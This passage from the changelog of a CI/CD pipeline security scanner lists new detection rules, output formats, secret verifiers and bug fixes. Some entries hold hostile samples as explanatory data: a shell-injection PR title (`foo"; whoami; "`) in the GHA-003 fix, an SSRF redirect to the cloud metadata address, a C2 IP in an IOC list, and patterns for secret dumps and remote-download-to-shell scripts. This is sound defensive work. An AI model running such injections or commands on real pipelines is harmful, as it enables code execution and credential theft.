  paths render with forward slashes (a Windows scan now reads like the
  docs) and head-truncate when long, so the filename and line number
  always survive instead of folding mid-token (`release.ym` / `l:172`).
  Severity colors match the design system's terminal-tuned scale
  (CRITICAL red, HIGH orange, MEDIUM gold, LOW cyan), so a CLI
  screenshot reads as the same product as the HTML report and docs.
  The `Conf.` column, which previously printed `HIG` on every row,
  now appears only when a shown finding sits below HIGH confidence, so
  the common all-high scan drops the noise column and gives titles the
  room. A single dim `Next →` line closes a terminal scan, pointing at
  `pipeline_check explain <top-rule>` and `--fix --apply` (when fixers
  exist) so even a passing run with findings says what to do next.
- **`init` reads like a guided tour.** The post-scan summary now prints
  the grade and the top-to-fix severities in the same color language as
  a scan report, forward-slashes the resource paths (matching the
  table), and closes with a numbered "next steps" block (commit the two
  files, see findings, `explain` the top rule, `--fix --apply`) instead
  of a single dense line. Clean scans get a "from a clean slate" path
  that points straight at the CI gate. The machine-readable `[init]`
  log lines are preserved for anything grepping the output.
- **Faster CLI startup and scans.** The provider registry now imports a
  provider module only when that provider is selected, instead of
  importing all 32 at load time, and `boto3` moved behind
  `TYPE_CHECKING` in the AWS modules (it was used only in annotations
  plus one `Session()` call). A GitHub-only scan or `--help` no longer
  pulls in `botocore` / `s3transfer`, so cold startup drops from ~346ms
  to ~138ms. Separately, `Scanner.run()` caches the standards-to-control
  resolution per check_id rather than rebuilding the same `ControlRef`
  list for every finding, which roughly halves the rule and
  post-processing phase on a workflow set with many findings. The
  attack-chain engine now filters the findings list to failing findings
  once before evaluating rules, instead of having each of the ~45 rules
  re-walk a list dominated by passing findings; on a large monorepo
  (~5k-16k findings) chain evaluation drops roughly 5x (about 9ms to
  2ms at 50 files). No behavior change: same findings, same controls,
  same chains, same gate results.
- **`--inline-explain` now spans every text reporter.** The flag used
  to affect only the terminal panel; the structured formats dropped
  `exploit_example` entirely. The include/skip decision now lives in a
  shared `inline_exploit()` gate in `checks/base.py`, and SARIF (rule
  `help.text` / `help.markdown`), JUnit (`<failure>` body), markdown (a
  collapsible Proof-of-exploit section after the failures table), and
  Code Quality (issue `description`) all honor it. `--output json` and
  `--output html` continue to carry the field unconditionally. The
  Code Quality fingerprint is unchanged (it hashes only `check_id` /
  path / line), so enabling the flag never churns a dismissed MR
  thread. 13 new tests.
- **Landing-page hero now performs a live scan (docs site).** The hero
  terminal types the command in, ticks a scanner spinner, streams
  findings with scanner cadence, counts the score up, and stamps the
  grade, replacing the previous fade-in. Its rule rows now carry real
  titles and severities from the registry (GHA-008 / 001 / 016 / 015)
  instead of an invented severity gradient, the scan result is exposed
  to screen readers behind a visually-hidden summary while the animated
  specimen stays `aria-hidden`, and the provider grid gains the Composer
  and RubyGems tiles. The headline accent gradient (previously scoped to
  a `.pg-hero__title` element absent from the markup) now renders.
  CSS-only reveal with a graceful no-JS / reduced-motion final state; no
  package behavior change.

### Fixed

- **Known-issues low-severity sweep (2026-05-31).** The open low-severity
  findings from the 2026-05-29 feature review, fixed together. **SARIF
  ingest** now maps a result with no `level` and no `security-severity` to
  MEDIUM (the SARIF 2.1.0 `warning` default) instead of INFO, so findings
  from tools that omit per-result level aren't dropped by a severity gate
  (an explicit `level: none` still maps to INFO). **`--diff-base`** anchors
  git's repo-root-relative output at the repo top, so a scan launched from
  a subdirectory no longer misses real changes. **The Terraform diff
  filter** maps each module call label to its source directory from the
  plan's `configuration` block, so a module whose label differs from its
  source dir (`module "vpc" { source = "./modules/networking" }`) keeps its
  changed resources (falls back to the old label heuristic when no
  configuration is present). **The GitLab `project:` include** handles a
  list-valued `file:` by fetching each entry instead of 404-ing on a
  stringified list. **The fleet GitHub enumerator** guards a null
  `clone_url` with `isinstance` like the GitLab / Bitbucket paths. **The
  JWT secret verifier** uses the real Microsoft Graph and Google OIDC
  UserInfo hosts instead of paths appended to the issuer. **The custom-rule
  evaluator** rejects `bool` (which subclasses `int`) in numeric and length
  operators so a YAML `true` isn't compared as `1`, and its `regex` op
  matches the full value within the cap so a `$` / `\Z` anchor binds to the
  real end of the string. **Passing Rego findings** carry `cwe` /
  `incident_refs` / `exploit_example` like the failing path, and a K8s rego
  violation that names no resource now reports the manifest path (when
  unambiguous) instead of defaulting to `<unknown>`.
  **Cosmetic:** the history line chart shows its "no history yet"
  placeholder for an all-zero dataset; an inline `reason=` keeps a
  multi-word reason; gate baseline matching normalizes path separators so a
  baseline written on one OS suppresses on another.
- **GHA-098 no longer counts `step-security/harden-runner` as a
  security scan.** harden-runner is a runtime egress monitor, not a
  SAST / SCA / secret scanner, so a deploy job whose only scan-shaped
  step was harden-runner incorrectly satisfied the scan-before-deploy
  gate. Removed it from the recognized-scanner set; its own
  configuration is now covered by GHA-107 / GHA-108 / GHA-109.
- **Script-injection false negative on inline shell assignments
  (GHA-003 and the shared taint engine).** `VAR="${{ github.event.* }}"`
  inside a `run:` block was treated as the safe capture-to-variable
  idiom and skipped. That idiom only holds for runtime shell/ADO
  expansions: GitHub substitutes `${{ … }}` into the script text before
  the shell parses it, so a PR title of `foo"; whoami; "` closes the
  assignment and runs `whoami`. `is_quoted_assignment` no longer
  whitelists `${{ … }}` assignments, so GHA-003 now flags them (the
  safe form remains routing the value through an `env:` block). The
  `$VAR` / `${VAR}` / `$(VAR)` runtime-expansion idioms used by the
  GitLab, Bitbucket, and Azure injection checks are unaffected.
- **Single-quoted shell references no longer false-positive (shared
  taint engine).** The quote-neutralization pass stripped only
  double-quoted segments, so `echo 'literal $VAR'` was reported as an
  unquoted injection even though single quotes suppress expansion
  entirely (single-quoting is itself a recommended mitigation). Both
  quote styles are now stripped before re-checking, with the
  double-quote alternative tried first so an apostrophe inside a
  double-quoted span (`"it's $VAR"`) is handled correctly. This also
  closes a matching false negative where a literal `"` inside two
  single-quoted segments masked a genuinely unquoted reference between
  them. Applies to the GitHub, GitLab, Bitbucket, and Azure
  script-injection checks.
- **Indirect taint through lowercase env vars (GHA taint graph,
  TAINT-001/002/003).** The shell env-var reference pattern was
  uppercase-only, so `echo "out=$title" >> "$GITHUB_OUTPUT"` (a
  lowercase env var bound to untrusted context) dropped the taint link
  and the downstream consumer was flagged by nothing. The name class is
  now case-insensitive; resolution still intersects the exact declared
  env keys, so it only recovers real flows.
- **GHA-002 now catches `github.head_ref` checkouts.** A
  `pull_request_target` workflow that checks out
  `ref: ${{ github.head_ref }}` (the documented shorthand for, and more
  common form than, `github.event.pull_request.head.ref`) was missed.
- **GHA-003 untrusted-context catalog: fork-repo fields added, `actor_id`
  over-match removed.** `github.event.pull_request.head.repo.*` and
  `workflow_run.head_repository.*` free-form fields (`description`,
  `homepage`, `default_branch`), all controlled by a fork PR author,
  are now treated as untrusted. Separately, the `github.actor`
  alternative gained a word boundary so it no longer swallows
  `github.actor_id` (a numeric account ID that can't carry shell
  metacharacters) into a false positive.
- **Shape-based secret detection now suppresses vendor examples and
  placeholders.** The `secret_shapes` catalog (used by the GitLab,
  Azure, Bitbucket, and Dockerfile literal-secret and AWS-long-lived
  rules) had no placeholder or vendor-example filter, so AWS's
  documented dummy key `AKIAIOSFODNN7EXAMPLE` was reported as a CRITICAL
  finding (it appears in many tutorials, and was even in some rules' own
  examples), and credential-named keys holding `REPLACE_ME` / `changeme`
  / `<your-token>` were flagged as leaked secrets. New `aws_key_in()` and
  `is_placeholder_value()` helpers reuse the same `VENDOR_EXAMPLE_TOKENS`
  / `PLACEHOLDER_MARKER_RE` suppression the entropy-based path already
  applied, so the two detection paths now agree. Real keys and real
  literal secrets are still flagged. The Kubernetes Secret-manifest
  checks (K8S-017/018/037) deliberately flag placeholders as a
  maintenance footgun and are intentionally left unchanged.
- **GitHub fine-grained PATs are now detected.** The secret catalog
  matched only the classic `ghp_/gho_/ghu_/ghs_/ghr_` prefixes; the
  `github_pat_…` fine-grained format (GitHub's recommended PAT since
  2022) was missed entirely. Added the shape and routed its `gi…`
  prefix through the token dispatch.

## [1.6.0] - 2026-05-29

### Added

- **Composer + RubyGems graduated from 8 to 10 rules each (4 new
  supply-chain detectors).**
  - **COMPOSER-009** flags ``auth.json`` committed alongside
    ``composer.json`` with literal credentials. Composer reads
    ``auth.json`` out of band for HTTP-basic / bearer / GitHub-OAuth
    / GitLab-OAuth / Bitbucket-OAuth tokens; its presence in git
    history is a credential leak. Placeholder values
    (``${COMPOSER_AUTH_TOKEN}`` / ``$ENV``) are ignored so a
    deliberately-templated auth.json doesn't false-positive. HIGH,
    13 standards mappings.
  - **COMPOSER-010** flags ``config.secure-http: false`` in
    ``composer.json``. Composer's default has been
    ``secure-http: true`` since 1.8; an explicit ``false`` is a
    project-wide HTTPS-enforcement downgrade that lets the
    resolver pull packages over plain HTTP from any source.
    Companion to COMPOSER-003 (per-URL HTTP detection).
    MEDIUM, 13 standards mappings.
  - **GEM-009** flags ``.bundle/config`` committed with embedded
    credentials. Detects literal-value entries under
    ``BUNDLE_GEMS__<HOST>`` / ``BUNDLE_GITHUB__COM`` /
    ``BUNDLE_*__USERNAME`` / ``BUNDLE_*__PASSWORD`` /
    ``BUNDLE_*__TOKEN`` keys. Placeholder values
    (``<%= ENV[...] %>`` / ``$ENV``) are ignored. HIGH, 13
    standards mappings.
  - **GEM-010** flags Gemfiles that use dynamic gem-list
    resolution (``Dir.glob`` / ``Dir[...]`` / ``eval(...)`` /
    ``instance_eval`` / ``require_relative`` / ``File.read``).
    The static-include helper ``eval_gemfile "<literal>"`` is
    explicitly allowed. Dynamic Gemfiles defeat every
    manifest-as-data audit (this rule pack, bundler-audit,
    dependabot). MEDIUM, 13 standards mappings.

  Lifts both providers' rule counts from 8 to 10, matching the
  gomod / cargo / pulumi MVP-graduates floor. README architecture
  block updated for both packs; comparison-table package-registries
  cell from ``91 rules across 8 providers`` to ``95 rules across 8
  providers``. Headline ``1060+ checks`` claim still in tolerance
  (catalog at 1072, tolerance window [1052, 1072]). 22 new unit
  tests, drift tests pass.

- **RubyGems / Bundler provider, 8 supply-chain rules.** New
  ``--pipeline rubygems`` / ``--rubygems-path`` parses ``Gemfile``
  (Bundler manifest, Ruby DSL) and probes for the sibling
  ``Gemfile.lock``. Text-only static analysis via a regex
  extractor over the canonical Bundler idioms (``source``, ``gem
  "name"``, scoped ``source … do … end`` blocks, ``group :dev``,
  option-hash forms with ``git:`` / ``github:`` / ``ref:`` /
  ``branch:`` / ``tag:`` / ``path:``), no ``bundle install``, no
  rubygems.org API access, no Ruby runtime required.
  Auto-detects ``./Gemfile`` at the working-directory root.
  Ships ``GEM-001..008``: missing Gemfile.lock, floating ``gem``
  constraint (covers no-version-at-all, ``~>``, ``>=``, ranges),
  plain-HTTP ``source``, source URL with embedded plaintext
  credentials, ``git:`` / ``github:`` source without a ``ref:``
  SHA pin (mutable branch / tag / default-HEAD), known-
  compromised gem version (curated registry seeded with
  rest-client 1.6.10-1.6.13 / strong_password 0.0.7, the two
  canonical RubyGems supply-chain incidents), multiple
  top-level sources without scoping (dependency-confusion
  vector), and ``gem … path: "..."`` declared outside ``group
  :development`` / ``:test``. Bumps the headline claim from
  ``1050+ checks across 31 providers`` to ``1060+ checks across
  32 providers`` and the comparison ``Package registries`` cell
  from ``83 rules across 7 providers`` to ``91 rules across 8
  providers``. 32 new unit tests, drift tests pass.

- **Composer (PHP) provider, 8 supply-chain rules.** New
  ``--pipeline composer`` / ``--composer-path`` parses
  ``composer.json`` (Composer manifest) and probes for the sibling
  ``composer.lock``. Mirrors the npm / PyPI / Maven / NuGet / Go
  modules / Cargo pack shape: text-only static analysis via the
  JSON stdlib parser, no ``composer install``, no Packagist
  access, no PHP runtime required. Auto-detects
  ``./composer.json`` at the working-directory root. Ships
  ``COMPOSER-001..008``: missing composer.lock, floating
  ``require`` constraint, plain-HTTP repository, repository URL
  with embedded plaintext credentials, ``minimum-stability``
  lowered to ``dev`` / ``alpha`` / ``beta`` / ``RC`` (widens
  every transitive constraint to dev-branch aliases), Composer
  ``scripts`` lifecycle hook piping a remote download into a
  shell, known-compromised package version (curated registry,
  seeded with the synthetic placeholder + a representative
  guzzlehttp/guzzle CVE entry), and ``config.allow-plugins:
  true`` (defeats Composer 2.2's plugin allowlist gate). Bumps
  the headline claim from ``1040+ checks across 30 providers``
  to ``1050+ checks across 31 providers`` and the comparison
  ``Package registries`` cell from ``75 rules across 6
  providers`` to ``83 rules across 7 providers``. 33 new unit
  tests, drift tests pass.

- **NPM-013, NUGET-010, OCI-009 (3 new package-ecosystem rules).**
  - **NPM-013** flags ``package.json`` ``files`` field entries
    that are broad wildcards (``*``, ``**``, ``**/*``, ``*/**``,
    ``.``, ``./``). Those publish the entire repo tree at
    ``npm publish`` time minus whatever ``.npmignore`` happens to
    block, the documented gap NPM-011's docstring already pointed
    at. HIGH severity, with 12 standards mappings.
  - **NUGET-010** flags ``NuGet.config`` storing a feed credential
    in plaintext via ``<packageSourceCredentials>`` /
    ``<add key="ClearTextPassword" .../>``. The parser captures
    presence only (no literal credential), so findings can't leak
    the value. HIGH severity, 13 standards mappings.
  - **OCI-009** flags image manifests missing OCI 1.1 base-image
    annotations ``org.opencontainers.image.base.name`` /
    ``base.digest`` (SLSA L3 base-image attribution gap;
    orthogonal to OCI-001's ``image.source`` / ``image.revision``).
    Honors the OCI-spec empty-string sentinel for ``scratch``
    images. MEDIUM severity, 13 standards mappings.

- **Inline explain mode (``--inline-explain``).** New terminal-output
  flag that injects each failing finding's ``exploit_example``
  (when one is recorded) directly under the existing
  Recommendation block, saving the
  ``pipeline_check --explain CHECK_ID`` round-trip when triaging
  in the terminal. No-op for JSON / SARIF / JUnit / markdown / HTML
  outputs, which already carry the field. The flag conflicts with
  the existing ``--explain CHECK_ID`` early-exit option, which is
  why it carries the ``inline-`` prefix. 5 new tests.

- **GitLab Code Quality output (``--output codequality``).** New output
  format emitting the Code Climate ``gl-code-quality-report`` JSON shape
  GitLab CI renders as inline MR annotations (the GitLab parallel of
  GitHub's SARIF code-scanning experience). Each failing finding becomes
  one entry per ``(check_id, location)`` pair, so an aggregate finding
  with N offending lines produces N inline annotations. Severity maps
  CRITICAL -> ``blocker``, HIGH -> ``critical``, MEDIUM -> ``major``,
  LOW -> ``minor``, INFO -> ``info``. ``fingerprint`` is a stable SHA-1
  over ``(check_id, path, line, description)`` so GitLab can dedupe
  identical findings across runs. Passing findings are skipped (the
  format has no "passed" concept). Zero new dependencies; 16 new tests.

- **Azure Cloud + GCP live cloud-posture providers (closes #163).** New
  ``--pipeline azure-cloud`` and ``--pipeline gcp`` providers reach AWS-
  shaped coverage. Phase 1 seeded each pack with 15 rules across
  identity, network, storage, compute, and logging; phase 2 expanded
  both to 50 rules. The providers shell out to ``az`` / ``gcloud`` for
  live inventory in the same pattern as the AWS provider's boto3 path.
  CIS Microsoft Azure Foundations Benchmark and CIS Google Cloud
  Foundations Benchmark are wired up as standards mappings. Provider
  rule counts: AZ 0 -> 50, GCP 0 -> 50.

- **Secret verifier expansion (phase 2).** Twelve new live-verification
  probes for ``--verify-secrets``: DigitalOcean (``/v2/account``),
  Netlify (``/api/v1/user``), Terraform Cloud (``/api/v2/account/details``),
  Linear (GraphQL ``viewer``), Atlassian (``/me``), Asana
  (``/api/1.0/users/me``), New Relic (NerdGraph ``actor``), Telegram Bot
  (``/getMe``), Replicate (``/v1/account``), Cohere (``/v2/models``),
  Mailchimp (datacenter extracted from key suffix, Basic auth),
  and Square (``/v2/locations``). All probes are read-only, rate-limited,
  and identity-extracting where the API supports it. Verifier count
  13 -> 25. 26 new tests.

- **Secrets-in-CI-logs detection (cross-provider).** Four new rules
  detecting ``echo`` / ``printf`` / ``cat`` of secret-named variables,
  ``printenv`` / ``env`` environment dumps, and ``set -x`` shell trace
  with secret-bound variables in scope: GL-036 (GitLab CI), BB-032
  (Bitbucket Pipelines), ADO-031 (Azure DevOps), CC-032 (CircleCI).
  Shared detection logic extracted to ``_primitives/log_leak.py``.
  Extends the GHA-033 pattern (GitHub Actions, already shipped) to
  every CI provider that supports inline scripts. Standards mappings
  across all 10 frameworks.
- **AI agent pipeline risk rules.** Two new rules expanding the
  GHA-058 agentic-CLI category. GHA-103 (CRITICAL) detects AI
  code-review bots (CodeRabbit, CodiumAI PR-Agent, Sourcery, Codeball,
  GitHub Copilot) running on ``pull_request_target`` or ``issue_comment``
  triggers with write permissions and no ``environment:`` gate, the
  attack vector demonstrated by the HackerBot-Claw campaign (February
  2026). GHA-104 (HIGH) detects workflows where an agentic CLI
  generates code and pushes commits directly (via ``git push`` or
  auto-commit actions like ``stefanzweifel/git-auto-commit-action``,
  ``EndBug/add-and-commit``) without routing through a pull request
  review cycle. Both rules pass when an ``environment:`` gate is
  present. GHA rule count 93 -> 95.
- **Gitea / Forgejo Actions provider.** ``--pipeline gitea`` reuses the
  full GHA rule pack against ``.gitea/workflows/`` and
  ``.forgejo/workflows/`` YAML files. Auto-detected when either
  directory is present. Rules fire under their original ``GHA-NNN`` IDs
  since Gitea Actions uses the same runner and syntax. GitHub-specific
  reputation rules (GHA-041..043, GHA-089..091, GHA-096) pass silently
  when ``--resolve-remote`` metadata is absent. Provider count
  26 -> 27.
- **History dashboard enhancements (closes #160).** The
  ``pipeline_check history`` dashboard gains three features: per-rule
  burn-down sparklines in the top-N firing rules table (inline SVG
  trend lines showing each rule's count across snapshots), a
  resource-level heatmap section showing which file paths consistently
  fail, and fleet directory integration so the history loader can read
  a fleet ``--output-dir`` directly (recursive ``**/findings.json``
  discovery with deduplication). 9 new tests.

### Changed

- **``exploit_example`` backfill on every CRITICAL and HIGH rule.**
  All 13 CRITICAL rules and all 36 HIGH rules now carry a concrete
  ``exploit_example`` paired with their existing recommendation
  prose. New rules at those severities ship one from the start;
  MEDIUM / LOW remain opportunistic. ``pipeline_check explain
  <RULE>`` surfaces the example inline when present.
- **Scorecard fixture exemption documented** in ``CONTRIBUTING.md``.
  The Scorecard workflow's SARIF filter that strips ``tests/`` and
  ``bench/`` results was already in place; the contributing guide now
  explains the pattern so future fixture authors know no manual
  exemption is needed.

### Fixed

- **Full-feature bug-review sweep (high + medium severity).** Nine
  fixes from a review of the engine and feature surface:
  1. **Remote-resolve SSRF via HTTP redirect (high).** The GitLab
     ``include: { remote: }`` fetcher and the GitHub raw fetcher
     rejected non-``https://`` URLs on the first hop but followed 3xx
     redirects to any scheme, so an ``https`` include could redirect to
     ``http://169.254.169.254/...`` or another internal host. Both now
     fetch through a shared ``HTTPSOnlyRedirectHandler`` opener
     (``_primitives/safe_http.py``) that refuses any redirect to a
     non-https target.
  2. **PyPI secret verifier promoted dead tokens.** A GET to
     ``upload.pypi.org/legacy/`` returns ``405`` regardless of the
     credential, but the verifier read ``405`` as VERIFIED, promoting
     any PyPI-shaped string to CRITICAL. It now reports UNKNOWN.
  3. **Google API-key verifier promoted invalid keys.** A
     ``400 INVALID_ARGUMENT`` (returned for an invalid key) was mapped
     to VERIFIED. The verifier now reserves VERIFIED for a ``200`` and
     classifies the invalid-key error as UNVERIFIED.
  4. **OSV cached truncated responses as clean.** A batch response with
     fewer result entries than queries left the unpaired packages
     looking advisory-free and cached them as clean for the TTL,
     suppressing real advisories. A length mismatch is now treated as a
     batch error (warned, not cached).
  5. **GitLab include cache key ignored the host.** The on-disk cache
     keyed on ``project:file@ref`` with no GitLab host, so the same
     project path on two ``--gitlab-url`` instances collided. The key
     is now host-scoped.
  6. **Cross-repo chains dropped reverse-direction pairs.** All four
     CXPC matchers deduped on an unordered ``(min, max)`` repo key, so
     ``X->Y`` and ``Y->X`` collapsed into one when both repos satisfied
     both legs. The key is now the ordered ``(repo_a, repo_b)`` pair.
  7. **Terminal reporter leaked Rich markup.** Finding and chain
     ``title`` / ``resource`` / ``description`` / ``recommendation`` /
     ``cwe`` / narrative fields were interpolated into Rich tables and
     panels without escaping (only ``exploit_example`` was escaped), so
     bracketed content was parsed as style markup and stripped. All
     user content now passes through ``rich.markup.escape``.
  8. **Autofix ``--apply`` flipped line endings on Windows.** Files
     were read with universal newlines and rewritten in text mode,
     converting a pure-LF file to CRLF on Windows. The apply path now
     reads and writes with ``newline=""`` and re-applies the detected
     ending, so only patched lines change.
  9. **Docker / package-install flag fixers reclassified unsafe.**
     ``_strip_docker_flags`` (GHA-017 family) and ``_strip_pkg_flags``
     (GHA-018 family) are whole-file strips that can remove a benign
     flag on a command other than the flagged one, changing job
     runtime. They are now ``safety="unsafe"`` so they only run under
     ``--fix=unsafe``.
  Also: ``history --dir`` pointed at a fleet ``--output-dir`` ingested
  the ``fleet.json`` aggregate as a bogus score-0 snapshot; non
  scan-output JSON (no ``score``/``findings``) is now skipped with a
  warning.
- **Code-review sweep on the post-v1.5 cycle.** Fifteen findings from
  a high-effort review of the GitLab Code Quality reporter,
  ``--inline-explain`` feature, docs-site fix, and action.yml
  packaging:
  1. **Rich markup leak in ``--inline-explain``.** Exploit examples
     contain literal ``[...]`` tokens (YAML lists, Terraform list
     refs, K8s capabilities); the Rich Panel parsed them as style
     markup and silently stripped 59 rules' bracketed segments.
     Escape the body through ``rich.markup.escape`` before
     interpolation, rename the label to ``Proof of exploit`` so it
     matches the ``--explain`` and HTML report surfaces, and pin
     the behavior with a regression test that walks bracketed
     fragments through the renderer.
  2. **Misleading ``--inline-explain`` help text.** The flag claimed
     SARIF, JUnit, and markdown outputs "already carry the field"
     when only JSON and HTML do. Rewrite the help text to name the
     surfaces that actually surface ``exploit_example`` and the
     ones that don't.
  3. **``action.yml`` ``output-file`` default ignored the chosen
     format.** A consumer setting ``output: codequality`` without
     overriding the filename got the JSON written to
     ``pipeline-check.sarif``, invisible to GitLab's
     ``artifacts.reports.codequality:`` slot. The composite action
     now derives a per-format default (``gl-code-quality-report.json``
     for codequality, ``pipeline-check.json`` for JSON,
     ``pipeline-check.xml`` for JUnit, etc.) when the input is
     blank, and ``upload-sarif`` reads the resolved path from the
     run step's output rather than the raw input.
  4. **Code Quality paths not normalized to forward slashes.** A
     Windows-hosted GitLab Runner emitted backslash paths GitLab
     couldn't match against the MR diff. Normalize before
     serializing, matching the SARIF reporter's convention. Pinned
     by tests covering both ``Location.path`` and the
     ``Finding.resource`` fallback path.
  5. **Code Quality fingerprint included description.** Description
     text drifts between releases (and per-run with flags like
     ``--verify-secrets-show-identity``), so the SHA-1 flipped and
     GitLab treated previously-dismissed MR threads as brand-new.
     Drop ``description`` from ``_fingerprint``; identity is now
     ``(check_id, normalized_path, line)`` only. Added regression
     tests covering description-drift and cross-OS-path stability.
  6. **Empty ``location.path`` in Code Quality output.** Findings
     with no structured location and an empty ``resource`` emitted
     ``"path": ""`` which the Code Climate schema rejects. Fall
     back to an ``"unknown"`` sentinel so the issue still surfaces.
  7. **``hashlib.sha1`` without ``usedforsecurity=False``.**
     Crashed on FIPS-mode hosts; trips Bandit B324. Added the
     kwarg.
  8. **``_SEVERITY_MAP`` silent fallback.** A future ``Severity``
     enum addition would silently downgrade to ``info`` via the
     dict-get default. New test asserts
     ``set(_SEVERITY_MAP) == set(Severity)``.
  9. **``.md-typeset table:not([class])`` selector fragility.** The
     ``is-visible`` → ``data-revealed`` rename treated only today's
     trigger; any future feature adding a class to a ``<table>``
     would have re-broken the same 13 rules. Replaced all 13
     selectors with ``table:not(.highlighttable)`` so the only
     opt-out is the known Pygments line-numbered case.
  10. **Eight hand-wired write-or-stdout branches in ``cli.py``.**
      Extract a single ``_emit_report(text, output_file, label,
      *, quiet)`` helper and route SARIF / JUnit / markdown /
      codequality / cyclonedx / threatmodel / JSON through it.
      Adding the next format is now one ``_emit_report(...)`` call
      instead of 11 lines of copy-paste. HTML keeps its own write
      path because the reporter bundles assets inside.
  11. **``--inline-explain`` only honored by the terminal reporter.**
      The flag's natural shape is a per-``Finding`` decision so
      SARIF, JUnit, markdown, and codequality could honor it too.
      Added a ROADMAP entry and a ``TODO(altitude)`` comment in
      ``reporter.py`` flagging the lift. Help-text fix in #2 makes
      the current carve-outs explicit in the interim.
  12. **No pre-commit hook running the drift suites.** Recurring
      ``fix(ci): ...`` commits (typing-extensions pin, codequality
      import sort + doc drift) all came from drift tests that
      passed locally but failed post-merge. Added
      ``.pre-commit-config.yaml`` with ruff on commit and the four
      drift suites (test_cli_docs_drift, test_doc_claims,
      test_english_variant, test_rule_framework) on pre-push.
      ``CONTRIBUTING.md`` documents ``pre-commit install --hook-
      type pre-push``. This is distinct from the existing
      ``.pre-commit-hooks.yaml`` which defines consumer-facing
      hooks for downstream users.
  13. **Divergent labels for ``exploit_example``.** ``explain.py``
      and the HTML reporter rendered ``Proof of exploit``; the new
      ``--inline-explain`` block used ``Exploit:``. Aligned all
      three on the canonical label.
  14. **Layout thrash in ``autoTagInnerPage``.** Interleaved
      ``getBoundingClientRect`` reads with ``setAttribute`` writes
      forced a layout reflow per iteration on long pages. Split
      into a pure-read pass that collects pending elements and a
      pure-write pass that applies the attributes.
  15. **Redundant ``sort_keys=False`` and ``default=False``
      kwargs.** Pure noise (both restate stdlib / Click defaults).
      Dropped from ``codequality_reporter`` and the ``--inline-
      explain`` Click option.

- **Doc-site tables lose their outline after instant-nav revisit.**
  The scroll-reveal animation in ``docs/javascripts/animations.js``
  tagged ``.md-typeset table:not([class])`` elements with
  ``data-reveal`` and, on intersection, added an ``is-visible`` class.
  The added class caused the 13 table-style rules in
  ``docs/stylesheets/extra.css`` keyed on ``table:not([class])``
  (border, border-radius, ``overflow:hidden``, padding, hover
  striping) to stop matching, so revealed tables rendered without
  their outline. The asymmetry between cold load and revisit came
  from Material's ``navigation.instant``: on a fresh navigation the
  chrome wasn't laid out when ``getBoundingClientRect()`` ran, so
  tables read under the 600px cutoff and never got tagged; on
  revisit positions measured correctly and the bug bit. Switched
  the reveal marker from ``.is-visible`` (class) to ``data-revealed``
  (attribute) across both files, so the marker no longer disturbs
  ``:not([class])`` selectors.

## [1.5.0] - 2026-05-27

### Added

- **Secret verifier expansion (phase 1).** Four new live-verification
  probes for ``--verify-secrets``: Docker Hub PAT, PyPI upload token,
  Google Cloud API key, and JWT (issuer-based routing with Auth0, Okta,
  Azure AD, Google userinfo probes). Verifier count 9 -> 13. 18 tests.
- **cicd-goat 38-scenario coverage push (31/38 -> 38/38).** Three new
  rules, one rule widening, and three new attack chains close all
  remaining gaps in the cicd-goat 38-scenario comparison matrix.
  GHA-100 (``cosign verify`` without ``--certificate-identity`` +
  ``--certificate-oidc-issuer``, scenario 35), TAINT-009
  (environment-protected secret flows to unprotected consumer job via
  ``needs.<job>.outputs``, scenario 36), GHA-102 (``actions/checkout``
  with ``submodules: recursive`` on a PR trigger, scenario 38).
  GHA-063 widened to promote severity to CRITICAL when the bot-actor
  gate combines with ``gh pr merge --auto`` or the
  ``hmarr/auto-approve-action`` family (confused-deputy primitive).
  AC-032 (cosign-unbound artifact to deploy), AC-033 (environment-secret
  laundering), AC-034 (submodule-poisoned PR to credential exfiltration).
  GHA rule count 90 -> 93; chain count 45 -> 48. 40 new tests.
- **Build-time dependency SBOM generation (``--output cyclonedx``).** New
  CycloneDX 1.6 JSON output format. ``--output cyclonedx`` emits a
  standards-compliant BOM of every build-time dependency the pipeline
  consumes: GitHub Actions (with SHA-pinning detection), Docker base
  images, npm packages, and PyPI requirements. Each component carries a
  PURL identifier and ``pipeline-check:`` namespaced properties
  (provider, kind, source file, pinned status). No new library
  dependency; the CycloneDX JSON structure is emitted directly.
  ``BaseProvider`` gains a ``build_dependencies()`` method; v1 ships
  extractors for 4 providers (GitHub, Dockerfile, npm, PyPI). 49 tests
  across unit, reporter, and end-to-end integration.
- **TeamPCP + Megalodon compromise entries.** Four new entries in the
  ``_compromised_actions`` registry: ``aquasecurity/trivy-action``
  (CVE-2026-33634, CVSS 9.4, 76 malicious SHAs from StepSecurity
  analysis), ``aquasecurity/setup-trivy`` (7 tags), ``checkmarx/
  kics-github-action`` (35 tags, SHAs from Wiz analysis), and
  ``checkmarx/ast-github-action`` (ref_pattern for v2.3.28-v2.3.36).
  Three Megalodon IOC entries in ``_worm_indicators``: "SysDiag"
  workflow name, C2 IP 216.126.225.129, and forged commit-author
  email patterns from the May 2026 mass-injection campaign. GHA-040
  and GHA-056 detect all of these automatically. Registry floors
  bumped 3 -> 7 (compromised) and 4 -> 7 (worm). 8 new tests.
- **OPA/Rego custom rule engine (``--rego-rules``, closes #176).** Users
  can now write custom rules in OPA Rego alongside the existing YAML
  custom-rule DSL. ``--rego-rules ./policies/`` discovers ``.rego``
  files, extracts metadata via ``opa inspect --annotations``, evaluates
  policies via ``opa eval``, and funnels results through the existing
  Finding/scoring/gating/SARIF pipeline with zero special-casing. Rego
  rules can target all 24 providers (not just the 7 the YAML DSL
  supports) because Rego handles any JSON input shape. Each ``.rego``
  file declares its rule ID, severity, and provider via OPA's built-in
  ``# METADATA`` annotation block. The ``opa`` binary is a soft
  dependency that fails cleanly with install instructions when missing.
  Config-file support via ``rego_rules:`` in ``.pipeline-check.yml``
  and ``pyproject.toml``. 22 tests across loader, runner, and
  end-to-end integration. See ``docs/writing_a_rego_rule.md``.
- **Live secret verification (``--verify-secrets``, closes #175).** Opt-in
  live probes on every credential-shaped finding. Behind
  ``--resolve-remote --verify-secrets``, each detected token is probed
  against its issuing API: VERIFIED (active, promotes to CRITICAL with
  identity), UNVERIFIED (revoked/rotated, demotes to LOW), or UNKNOWN
  (no change). Initial verifier pack: GitHub PAT, NPM token, Slack
  token, GitLab PAT, Anthropic, OpenAI, Hugging Face, Stripe, and
  SendGrid API keys. ``--verify-secrets-show-identity`` opts into full
  identity strings in output. Stderr nudge printed when secrets found
  without verification enabled. Raw secret values are never persisted;
  cache keys are SHA-256 digests.
- **Integrated PR review comments into the top-level GitHub Action
  (closes #171).** The `pr-comment` input (default `true` on
  `pull_request` events) posts inline review comments on the PR diff
  and a summary comment for off-diff findings. Reuses the JSON
  sidecar from the scan step so no extra scan is needed. The nested
